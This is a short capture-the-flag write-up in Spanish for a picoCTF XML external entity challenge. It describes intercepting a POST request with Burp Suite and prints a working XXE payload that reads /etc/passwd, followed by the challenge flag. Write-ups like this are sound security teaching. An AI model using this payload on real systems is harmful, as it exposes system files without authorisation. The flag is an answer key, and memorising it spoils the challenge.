#### Descripción

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
##### Pista
XML external entity Injection

#### Solución 
Para este problema usaremos burpsite y foxyproxy, para interceptar lo que se manda por post, ahi podemos ver que hay una vulnerabilidad de XXE en donde podemos usar un payload para entrar al usr. 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data><ID>&xxe;</ID></data>
```
Con esto ya nos da la bandera en la respuesta.
`picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}`

#### Notas Adicionales

#### Referencias
